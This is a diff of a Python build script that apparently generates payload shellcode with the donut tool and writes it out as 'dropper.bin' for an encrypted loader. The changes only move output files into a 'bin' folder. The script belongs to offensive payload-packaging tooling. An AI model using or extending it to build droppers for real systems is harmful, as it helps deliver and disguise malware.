@@ -43,7 +43,10 @@ def printCiphertext(ciphertext):
 
 
 def main(argv):
-        fileEncrypt = open('cryptDef.h', 'w')
+        if os.name == 'nt':
+                fileEncrypt = open('.\\bin\\cryptDef.h', 'w')
+        else:
+                fileEncrypt = open('./bin/cryptDef.h', 'w')
         fileClear = open('clearDef.h', 'r')
 
         if(len(argv)<2):
@@ -80,9 +83,9 @@ def main(argv):
                 print('binaryArgs ', binaryArgs)
                 print('')
                 if os.name == 'nt':
-                        args = ('.\\ressources\\donut.exe', '-f', '1', '-m', 'go', '-p', binaryArgs, '-o', '.\\dropper.bin', binary)
+                        args = ('.\\ressources\\donut.exe', '-f', '1', '-m', 'go', '-p', binaryArgs, '-o', '.\\bin\\dropper.bin', binary)
                 else:   
-                        args = ('./ressources/donut', '-f', '1', '-m', 'go', '-p', binaryArgs, '-o', './dropper.bin', '-i' , binary)
+                        args = ('./ressources/donut', '-f', '1', '-m', 'go', '-p', binaryArgs, '-o', './bin/dropper.bin', '-i' , binary)
                 popen = subprocess.Popen(args, stdout=subprocess.PIPE)
                 popen.wait()
                 output = popen.stdout.read()
@@ -90,7 +93,10 @@ def main(argv):
                 print("[+] Generate shellcode of payload with donut")
                 print(output.decode("utf-8") )
 
-                shellcode = open("dropper.bin", "rb").read()
+                if os.name == 'nt':
+                        shellcode = open(".\\bin\\dropper.bin", "rb").read()
+                else:
+                        shellcode = open("./bin/dropper.bin", "rb").read() 
 
         elif rawShellCode:
                 print('rawShellCode ', rawShellCode)
